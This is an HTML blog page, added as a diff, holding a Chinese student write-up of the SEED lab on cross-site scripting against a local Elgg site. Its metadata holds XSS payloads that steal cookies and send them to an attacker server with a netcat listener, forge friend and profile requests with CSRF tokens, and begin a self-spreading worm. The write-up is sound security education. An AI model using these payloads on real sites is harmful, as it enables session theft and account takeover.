@@ -1,0 +1,982 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>SEEDlab—跨站脚本（XSS）攻击实验 | Smera1d0&#39;s Blog</title>
+<meta name="keywords" content="软件安全">
+<meta name="description" content="Task 1: 上传恶意消息以显示警告窗口
+
+此任务的目标是在 Elgg 的个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时会执行 JavaScript 程序并显示一个警告窗口。
+
+1. 直接嵌入
+以下的 JavaScript 代码将显示一个警告窗口：">
+<meta name="author" content="Mi Yu">
+<link rel="canonical" href="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.eb8f5da85697cd810df09cc87c7f69c1a1690fdc75d0a7bc8bcd70301c4c3cca.css" integrity="sha256-649dqFaXzYEN8JzIfH9pwaFpD9x10Ke8i81wMBxMPMo=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://smera1d0.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://smera1d0.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://smera1d0.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://smera1d0.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://smera1d0.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+<script type="text/javascript" async
+    src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [['$', '$'], ['\\(', '\\)']],
+                displayMath: [['$$', '$$'], ['\[\[', '\]\]']],
+                processEscapes: true,
+                processEnvironments: true,
+                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+                TeX: {
+                    equationNumbers: { autoNumber: "AMS" },
+                    extensions: ["AMSmath.js", "AMSsymbols.js"]
+                }
+            },
+            "HTML-CSS": {
+                availableFonts: ["Arial", "TeX"],
+                preferredFont: "TeX",
+                webFont: "TeX"
+            }
+        });
+
+        MathJax.Hub.Queue(function () {
+            
+            
+            
+            var all = MathJax.Hub.getAllJax(), i;
+            for (i = 0; i < all.length; i += 1) {
+                all[i].SourceElement().parentNode.className += ' has-jax';
+            }
+        });
+    </script>
+
+<style>
+    code.has-jax {
+        font: inherit;
+        font-size: 100%;
+        background: inherit;
+        border: inherit;
+        color: #515151;
+    }
+</style>
+<meta property="og:title" content="SEEDlab—跨站脚本（XSS）攻击实验" />
+<meta property="og:description" content="Task 1: 上传恶意消息以显示警告窗口
+
+此任务的目标是在 Elgg 的个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时会执行 JavaScript 程序并显示一个警告窗口。
+
+1. 直接嵌入
+以下的 JavaScript 代码将显示一个警告窗口：" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/" /><meta property="og:image" content="https://smera1d0.github.io/images/papermod-cover.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-01-12T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-01-12T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://smera1d0.github.io/images/papermod-cover.png"/>
+
+<meta name="twitter:title" content="SEEDlab—跨站脚本（XSS）攻击实验"/>
+<meta name="twitter:description" content="Task 1: 上传恶意消息以显示警告窗口
+
+此任务的目标是在 Elgg 的个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时会执行 JavaScript 程序并显示一个警告窗口。
+
+1. 直接嵌入
+以下的 JavaScript 代码将显示一个警告窗口："/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://smera1d0.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "SEEDlab—跨站脚本（XSS）攻击实验",
+      "item": "https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SEEDlab—跨站脚本（XSS）攻击实验",
+  "name": "SEEDlab—跨站脚本（XSS）攻击实验",
+  "description": "Task 1: 上传恶意消息以显示警告窗口 此任务的目标是在 Elgg 的个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时会执行 JavaScript 程序并显示一个警告窗口。\n1. 直接嵌入 以下的 JavaScript 代码将显示一个警告窗口：\n",
+  "keywords": [
+    "软件安全"
+  ],
+  "articleBody": "Task 1: 上传恶意消息以显示警告窗口 此任务的目标是在 Elgg 的个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时会执行 JavaScript 程序并显示一个警告窗口。\n1. 直接嵌入 以下的 JavaScript 代码将显示一个警告窗口：\n\u003cscript\u003ealert('XSS');\u003c/script\u003e 下面我将使用 Alice 的账户做测试，实现显示警告窗口：\n首先登陆 Alice 的账户，用户账户如下所示： ----------------------------\rUserName | Password\r----------------------------\radmin | seedelgg\ralice | seedalice\rboby | seedboby\rcharlie | seedcharlie\rsamy | seedsamy\r---------------------------- 依次点击 Account -\u003e Edit profile 进入个人资料编辑页面，在 brief description 处写入 JavaScript 代码： 保存并刷新页面，显示了警告弹窗。 2. 通过 src 属性引用嵌入 2.1 搭建一个本地 Web 服务器 创建一个目录，在目录下创建 JavaScript 脚本文件 xss_worm.js。 使用命令 python3 -m http.server 9999 启动 Web 服务。 在 /etc/hosts 文件中设置域名，将 127.0.0.1 映射到 www.miyu.com 使用 http://www.miyu.com:9999/myscripts.js 访问 JS 脚本。 2.2 使用 src 属性引用 如果你的 JavaScript 脚本过长，可以将 JavaScript 程序保存在文件中，然后使用 src 属性引用。\n\u003cscript type=\"text/javascript\" src=\"http://www.miyu.com:9999/myscripts.js\"\u003e \u003c/script\u003e 访问主页，如下所示：\nTask 2：上传恶意代码以显示 Cookies 此任务的目标是在你的 Elgg 的个人资料中嵌入一个 JavaScript 程序，使得当其他用户查看你的个人资料时该用户的 cookies 将显示在警告窗口中。\n修改 Task 1 的代码，使用 document.cookie 获取当前页面的所有cookies：\n\u003cscript\u003ealert(document.cookie);\u003c/script\u003e 效果如下所示：\nTask 3：窃取受害者机器的 Cookies 在前一个任务中，攻击者编写的恶意 JavaScript 代码可以打印出用户的 cookies，但只有用户可以看到 cookies，而不是攻击者。在这个任务中，攻击者希望 JavaScript 代码将用户 cookies 发送给自己。\n我们可以使用 标签实现 cookies 的发送，当 标签被插入到页面时，浏览器发出 URL 请求，利用 URL 请求，将 cookies 发送到攻击者的服务器。\n\u003cscript\u003e document.write('+ escape(document.cookie) + ' \u003e'); \u003c/script\u003e 同时，我们使用 netcat(nc) 监听 5555 端口，使用如下命令：\nnc -lknv 5555 -l 参数表示 nc 监听的是一个传入连接。 -nv 参数用于显示更详细的输入。 -k 参数表示当一个连接完成时，监听另一个连接。 实验结果如下所示：\n可以发现红框中的部分为访问者的 Cookie 信息，成功窃取到了受害者的 Cookie。\nTask 4：成为受害者的朋友 我们将编写一个 XSS 蠕虫，使得任何其他访问 Samy 页面的用户都会加 Samy 为朋友。\n1. 确定参数 在编写恶意的 JavaScript 程序之前，我们需要先搞清楚添加朋友是通过请求哪些参数来实现的，使用 FireFox 的插件 HTTP header live 可以获取发送朋友请求时的全部请求信息，我们先登陆 Samy 的账户，并对 Alice 发送好友请求，并使用 HTTP header live 插件来捕获信息。\n依次点击 Members -\u003e Alice -\u003e Add friend 即可添加好友，点击 Add friend 时捕获到的 GET 请求如下所示：\nhttp://www.seed-server.com/action/friends/add?friend=56\u0026__elgg_ts=1730886267\u0026__elgg_token=QsFgZUqbfQ83KK3rUNkHhQ\u0026__elgg_ts=1730886267\u0026__elgg_token=QsFgZUqbfQ83KK3rUNkHhQ 我们发现想要完成添加好友的操作，必须获取几个参数：\nfriend 编号，可以得出 Samy 的编号为 59 __elgg_ts 参数 __elgg_token 参数 2. 编写 JavaScript 脚本 根据第一步的分析，我们可以写出如下JS脚本:\n\u003cscript type=\"text/javascript\"\u003e window.onload = function () { var Ajax=null; var ts=\"\u0026__elgg_ts=\"+elgg.security.token.__elgg_ts; //（1） var token=\"\u0026__elgg_token=\"+elgg.security.token.__elgg_token; //（2） //Construct the HTTP request to add Samy as a friend. var sendurl=\"http://www.seed-server.com/action/friends/add?friend=59\"+ts+token+ts+token; //FILL IN //Create and send Ajax request to add friend Ajax=new XMLHttpRequest(); Ajax.open(\"GET\", sendurl, true); Ajax.send(); } \u003c/script\u003e 3. 攻击测试 首先登陆 Alice 的账户，确认其没有添加 Samy 的好友。 点击 Samy 的 Profile，并查看好友列表，发现自动添加了 Samy 的好友。 4. Q \u0026 A Q1：解释第 (1) 行和第 (2) 行的目的，为什么需要这两行？\nvar ts = \"\u0026__elgg_ts=\" + elgg.security.token.__elgg_ts;用于获取一个时间戳（__elgg_ts）的值，可以用于防止 CSRF（跨站请求伪造）攻击，它可以确保请求是由合法用户发出的，并且请求的时间窗不会过期。\nvar token = \"\u0026__elgg_token=\" + elgg.security.token.__elgg_token;用于获取一个 CSRF 令牌，也是为了防止 CSRF 攻击，它可以确保请求没有被篡改。\nQ2：如果 Elgg 应用程序仅为“About Me”部分提供编辑器模式，即你无法切换到文本模式，你还能成功发起攻击吗？\n不可以，因为编辑器模式会对部分符号进行转义，而且会给每一行加上 标签，并在行末加入 换行符，使得我们的 JavaScript 脚本无法执行，如下所示：\n\u003cp\u003e\u0026lt;script type=\"text/javascript\"\u0026gt;\u003cbr /\u003e window.onload = function () {\u003cbr /\u003e \u0026nbsp;\u0026nbsp; \u0026nbsp;var Ajax=null;\u003c/p\u003e \u003cp\u003e\u0026nbsp;\u0026nbsp; \u0026nbsp;var ts=\"\u0026amp;__elgg_ts=\"+elgg.security.token.__elgg_ts; //（1）\u003cbr /\u003e \u0026nbsp;\u0026nbsp; \u0026nbsp;var token=\"\u0026amp;__elgg_token=\"+elgg.security.token.__elgg_token; //（2）\u003c/p\u003e \u003cp\u003e\u0026nbsp;\u0026nbsp; \u0026nbsp;//Construct the HTTP request to add Samy as a friend.\u003cbr /\u003e \u0026nbsp;\u0026nbsp; \u0026nbsp;var sendurl=\"http://www.seed-server.com/action/friends/add?friend=59\"+ts+token+ts+token; //FILL IN\u003c/p\u003e Task 5：修改受害者的个人资料 这个任务的目标是在受害者访问 Samy 的界面时修改受害者的个人资料。\n1. 确定参数 修改 Profile 的时候使用插件 HTTP Header Live 抓取 URL，发现修改时会发送一个 POST 请求：\n发送了一个这样的请求：\n__elgg_token=ve9v_2hFvL5So_x9hQc_xg\u0026__elgg_ts=1731067312\u0026name=Samy\u0026description=\u003cp\u003e1111\u003c/p\u003e\u0026guid=59 于是我们需要获取一下参数：\n__elgg_token: CSRF 令牌 __elgg_ts：时间戳 name：用户名 description：修改的内容 guid：用户id，samy 的 guid 为 59 2. 编写 JavaScript 脚本 根据第一步的分析，我们可以写出如下脚本：\n\u003cscript type=\"text/javascript\"\u003e window.onload = function(){ //JavaScript code to access user name, user guid, Time Stamp __elgg_ts //and Security Token __elgg_token var userName=\"\u0026name=\"+elgg.session.user.name; var guid=\"\u0026guid=\"+elgg.session.user.guid; var ts=\"\u0026__elgg_ts=\"+elgg.security.token.__elgg_ts; var token=\"\u0026__elgg_token=\"+elgg.security.token.__elgg_token; //Construct the content of your url. var content=token+ts+userName+\"\u0026description=Your profile has been changed!!!\"+guid; //FILL IN var samyGuid=59; //FILL IN var sendurl=\"http://www.seed-server.com/action/profile/edit\"; //FILL IN if(elgg.session.user.guid!=samyGuid) { //Create and send Ajax request to modify profile var Ajax=null; Ajax=new XMLHttpRequest(); Ajax.open(\"POST\", sendurl, true); Ajax.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); Ajax.send(content); } } \u003c/script\u003e 3. 攻击测试 登录 Alice 的账户，访问 Samy 的主页，发现 Alice 的 About me 改成了 JavaScript 脚本中设置的 Your profile has been changed!!!。\n4. Q \u0026 A Q3：我们为什么需要第 (1) 行？删除这行，重复你的攻击。报告并解释你的观察结果。\n这行判断用户的 guid 是否是 Samy 的 guid，如果不是，再发送 POST 请求进行攻击，这样可以防止 Samy 自己被攻击。\n如果删除第一行，samy 自己也会受到攻击，删除这行，重复攻击，如下所示：\n可以发现 Samy 的恶意脚本也被替换成了 Your profile has been changed!!!，导致无法进行下一次的攻击。\nTask 6：编写自传播 XSS 蠕虫 恶意 JavaScript 程序要成为真正的蠕虫，应该要实现自传播。也就是说，每当有人查看受感染的个人资料时，他们的个人资料不仅会被修改，蠕虫还会传播到他们的个人资料中，进一步影响查看这些新感染资料的其他人。在这个任务中，你需要实现这样一个蠕虫，它不仅修改受害者的个人资料并将用户“Samy”添加为朋友，还将蠕虫本身的副本添加到受害者的个人资料中，这样受害者就变成了攻击者。\n1. Link 方法 \u003cscript type=\"text/javascript\" src=\"http://www.miyu.com:9999/xss_worm.js\"\u003e\u003c/script\u003e 可以使用 src 属性嵌入恶意脚本，并利用这个恶意脚本将以上这段代码传递到其他人的 Profile，这样就实现了自传播的 XSS 蠕虫。\n以下是 xss_worm.js 的实现：\nwindow.onload = function(){ //JavaScript code to access user name, user guid, Time Stamp __elgg_ts //and Security Token __elgg_token var userName=\"\u0026name=\"+elgg.session.user.name; var guid=\"\u0026guid=\"+elgg.session.user.guid; var ts=\"\u0026__elgg_ts=\"+elgg.security.token.__elgg_ts; var token=\"\u0026__elgg_token=\"+elgg.security.token.__elgg_token; //Construct the content of your url. var content=token+ts+userName+\"\u0026description=Your profile has been changed!!!\u003c\\/p\u003e",
+  "wordCount" : "4116",
+  "inLanguage": "zh",
+  "datePublished": "2024-01-12T00:00:00Z",
+  "dateModified": "2024-01-12T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Mi Yu"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C4-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Smera1d0's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://smera1d0.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://smera1d0.github.io/" accesskey="h" title="Smera1d0&#39;s Blog (Alt + H)">Smera1d0&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                    <li>
+                        <a href="https://smera1d0.github.io/en/" title="English"
+                            aria-label="English">English</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://smera1d0.github.io/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://smera1d0.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://smera1d0.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://github.com/adityatelange/hugo-PaperMod/wiki/" title="WiKi">
+                    <span>WiKi</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://smera1d0.github.io/">主页</a>&nbsp;»&nbsp;<a href="https://smera1d0.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      SEEDlab—跨站脚本（XSS）攻击实验
+    </h1>
+    <div class="post-meta"><span title='2024-01-12 00:00:00 +0000 UTC'>一月 12, 2024</span>&nbsp;·&nbsp;9 分钟&nbsp;·&nbsp;Mi Yu&nbsp;|&nbsp;<a href="https://github.com/smera1d0/smera1d0.github.io/tree/main/posts/posts/%e3%80%90%e8%bd%af%e4%bb%b6%e5%ae%89%e5%85%a8%e3%80%91%e5%ae%9e%e9%aa%8c4%20%e8%b7%a8%e7%ab%99%e8%84%9a%e6%9c%ac%ef%bc%88XSS%ef%bc%89%e6%94%bb%e5%87%bb%e5%ae%9e%e9%aa%8c.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">目录</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#task-1-%e4%b8%8a%e4%bc%a0%e6%81%b6%e6%84%8f%e6%b6%88%e6%81%af%e4%bb%a5%e6%98%be%e7%a4%ba%e8%ad%a6%e5%91%8a%e7%aa%97%e5%8f%a3" aria-label="Task 1: 上传恶意消息以显示警告窗口">Task 1: 上传恶意消息以显示警告窗口</a><ul>
+                        
+                <li>
+                    <a href="#1-%e7%9b%b4%e6%8e%a5%e5%b5%8c%e5%85%a5" aria-label="1. 直接嵌入">1. 直接嵌入</a></li>
+                <li>
+                    <a href="#2-%e9%80%9a%e8%bf%87-src-%e5%b1%9e%e6%80%a7%e5%bc%95%e7%94%a8%e5%b5%8c%e5%85%a5" aria-label="2. 通过 src 属性引用嵌入">2. 通过 src 属性引用嵌入</a><ul>
+                        
+                <li>
+                    <a href="#21-%e6%90%ad%e5%bb%ba%e4%b8%80%e4%b8%aa%e6%9c%ac%e5%9c%b0-web-%e6%9c%8d%e5%8a%a1%e5%99%a8" aria-label="2.1 搭建一个本地 Web 服务器">2.1 搭建一个本地 Web 服务器</a></li>
+                <li>
+                    <a href="#22-%e4%bd%bf%e7%94%a8-src-%e5%b1%9e%e6%80%a7%e5%bc%95%e7%94%a8" aria-label="2.2 使用 src 属性引用">2.2 使用 src 属性引用</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#task-2%e4%b8%8a%e4%bc%a0%e6%81%b6%e6%84%8f%e4%bb%a3%e7%a0%81%e4%bb%a5%e6%98%be%e7%a4%ba-cookies" aria-label="Task 2：上传恶意代码以显示 Cookies">Task 2：上传恶意代码以显示 Cookies</a></li>
+                <li>
+                    <a href="#task-3%e7%aa%83%e5%8f%96%e5%8f%97%e5%ae%b3%e8%80%85%e6%9c%ba%e5%99%a8%e7%9a%84-cookies" aria-label="Task 3：窃取受害者机器的 Cookies">Task 3：窃取受害者机器的 Cookies</a></li>
+                <li>
+                    <a href="#task-4%e6%88%90%e4%b8%ba%e5%8f%97%e5%ae%b3%e8%80%85%e7%9a%84%e6%9c%8b%e5%8f%8b" aria-label="Task 4：成为受害者的朋友">Task 4：成为受害者的朋友</a><ul>
+                        
+                <li>
+                    <a href="#1-%e7%a1%ae%e5%ae%9a%e5%8f%82%e6%95%b0" aria-label="1. 确定参数">1. 确定参数</a></li>
+                <li>
+                    <a href="#2-%e7%bc%96%e5%86%99-javascript-%e8%84%9a%e6%9c%ac" aria-label="2. 编写 JavaScript 脚本">2. 编写 JavaScript 脚本</a></li>
+                <li>
+                    <a href="#3-%e6%94%bb%e5%87%bb%e6%b5%8b%e8%af%95" aria-label="3. 攻击测试">3. 攻击测试</a></li>
+                <li>
+                    <a href="#4-q--a" aria-label="4. Q &amp; A">4. Q &amp; A</a></li></ul>
+                </li>
+                <li>
+                    <a href="#task-5%e4%bf%ae%e6%94%b9%e5%8f%97%e5%ae%b3%e8%80%85%e7%9a%84%e4%b8%aa%e4%ba%ba%e8%b5%84%e6%96%99" aria-label="Task 5：修改受害者的个人资料">Task 5：修改受害者的个人资料</a><ul>
+                        
+                <li>
+                    <a href="#1-%e7%a1%ae%e5%ae%9a%e5%8f%82%e6%95%b0-1" aria-label="1. 确定参数">1. 确定参数</a></li>
+                <li>
+                    <a href="#2-%e7%bc%96%e5%86%99-javascript-%e8%84%9a%e6%9c%ac-1" aria-label="2. 编写 JavaScript 脚本">2. 编写 JavaScript 脚本</a></li>
+                <li>
+                    <a href="#3-%e6%94%bb%e5%87%bb%e6%b5%8b%e8%af%95-1" aria-label="3. 攻击测试">3. 攻击测试</a></li>
+                <li>
+                    <a href="#4-q--a-1" aria-label="4. Q &amp; A">4. Q &amp; A</a></li></ul>
+                </li>
+                <li>
+                    <a href="#task-6%e7%bc%96%e5%86%99%e8%87%aa%e4%bc%a0%e6%92%ad-xss-%e8%a0%95%e8%99%ab" aria-label="Task 6：编写自传播 XSS 蠕虫">Task 6：编写自传播 XSS 蠕虫</a><ul>
+                        
+                <li>
+                    <a href="#1-link-%e6%96%b9%e6%b3%95" aria-label="1. Link 方法">1. Link 方法</a></li>
+                <li>
+                    <a href="#2-dom-%e6%96%b9%e6%b3%95" aria-label="2. DOM 方法">2. DOM 方法</a></li></ul>
+                </li>
+                <li>
+                    <a href="#task-7%e4%bd%bf%e7%94%a8-csp-%e6%8a%b5%e5%be%a1-xss-%e6%94%bb%e5%87%bb" aria-label="Task 7：使用 CSP 抵御 XSS 攻击">Task 7：使用 CSP 抵御 XSS 攻击</a><ul>
+                        
+                <li>
+                    <a href="#1-%e7%bd%91%e9%a1%b5%e5%89%8d%e7%ab%af%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90" aria-label="1. 网页前端代码分析">1. 网页前端代码分析</a></li>
+                <li>
+                    <a href="#2-csp-%e7%ad%96%e7%95%a5%e8%ae%be%e7%bd%ae%e6%96%87%e4%bb%b6" aria-label="2. CSP 策略设置文件">2. CSP 策略设置文件</a></li>
+                <li>
+                    <a href="#3-q--a" aria-label="3. Q &amp; A">3. Q &amp; A</a><ul>
+                        
+                <li>
+                    <a href="#31-%e6%8f%8f%e8%bf%b0%e5%b9%b6%e8%a7%a3%e9%87%8a%e4%bd%a0%e8%ae%bf%e9%97%ae%e8%bf%99%e4%ba%9b%e7%bd%91%e7%ab%99%e6%97%b6%e7%9a%84%e8%a7%82%e5%af%9f%e7%bb%93%e6%9e%9c" aria-label="3.1 描述并解释你访问这些网站时的观察结果。">3.1 描述并解释你访问这些网站时的观察结果。</a></li>
+                <li>
+                    <a href="#32-%e7%82%b9%e5%87%bb%e6%89%80%e6%9c%89%e4%b8%89%e4%b8%aa%e7%bd%91%e7%ab%99%e7%bd%91%e9%a1%b5%e4%b8%ad%e7%9a%84%e6%8c%89%e9%92%ae%e6%8f%8f%e8%bf%b0%e5%b9%b6%e8%a7%a3%e9%87%8a%e4%bd%a0%e7%9a%84%e8%a7%82%e5%af%9f%e7%bb%93%e6%9e%9c" aria-label="3.2 点击所有三个网站网页中的按钮，描述并解释你的观察结果。">3.2 点击所有三个网站网页中的按钮，描述并解释你的观察结果。</a></li>
+                <li>
+                    <a href="#33-%e6%9b%b4%e6%94%b9-example32b-%e4%b8%8a%e7%9a%84%e6%9c%8d%e5%8a%a1%e5%99%a8%e9%85%8d%e7%bd%ae%e4%bf%ae%e6%94%b9-apache-%e9%85%8d%e7%bd%ae%e4%bd%bf-areas-5-%e5%92%8c-6-%e6%98%be%e7%a4%ba-ok%e8%af%b7%e5%9c%a8%e5%ae%9e%e9%aa%8c%e6%8a%a5%e5%91%8a%e4%b8%ad%e5%86%99%e5%87%ba%e4%bd%a0%e4%bf%ae%e6%94%b9%e7%9a%84%e9%85%8d%e7%bd%ae" aria-label="3.3 更改 example32b 上的服务器配置（修改 Apache 配置），使 Areas 5 和 6 显示 OK。请在实验报告中写出你修改的配置。">3.3 更改 example32b 上的服务器配置（修改 Apache 配置），使 Areas 5 和 6 显示 OK。请在实验报告中写出你修改的配置。</a></li>
+                <li>
+                    <a href="#34-%e6%9b%b4%e6%94%b9-example32c-%e4%b8%8a%e7%9a%84%e6%9c%8d%e5%8a%a1%e5%99%a8%e9%85%8d%e7%bd%ae%e4%bf%ae%e6%94%b9-php-%e4%bb%a3%e7%a0%81%e4%bd%bf-areas-1245-%e5%92%8c-6-%e9%83%bd%e6%98%be%e7%a4%ba-ok%e8%af%b7%e5%9c%a8%e5%ae%9e%e9%aa%8c%e6%8a%a5%e5%91%8a%e4%b8%ad%e5%86%99%e5%87%ba%e4%bd%a0%e4%bf%ae%e6%94%b9%e7%9a%84%e9%85%8d%e7%bd%ae" aria-label="3.4 更改 example32c 上的服务器配置（修改 PHP 代码），使 Areas 1、2、4、5 和 6 都显示 OK。请在实验报告中写出你修改的配置。">3.4 更改 example32c 上的服务器配置（修改 PHP 代码），使 Areas 1、2、4、5 和 6 都显示 OK。请在实验报告中写出你修改的配置。</a></li>
+                <li>
+                    <a href="#35-%e8%af%b7%e8%a7%a3%e9%87%8a%e4%b8%ba%e4%bb%80%e4%b9%88-csp-%e5%8f%af%e4%bb%a5%e5%b8%ae%e5%8a%a9%e9%98%b2%e6%ad%a2%e8%b7%a8%e7%ab%99%e8%84%9a%e6%9c%ac%e6%94%bb%e5%87%bb" aria-label="3.5 请解释为什么 CSP 可以帮助防止跨站脚本攻击。">3.5 请解释为什么 CSP 可以帮助防止跨站脚本攻击。</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="task-1-上传恶意消息以显示警告窗口">Task 1: 上传恶意消息以显示警告窗口<a hidden class="anchor" aria-hidden="true" href="#task-1-上传恶意消息以显示警告窗口">#</a></h2>
+<blockquote>
+<p>此任务的目标是在 Elgg 的个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时会执行 JavaScript 程序并显示一个警告窗口。</p>
+</blockquote>
+<h3 id="1-直接嵌入">1. 直接嵌入<a hidden class="anchor" aria-hidden="true" href="#1-直接嵌入">#</a></h3>
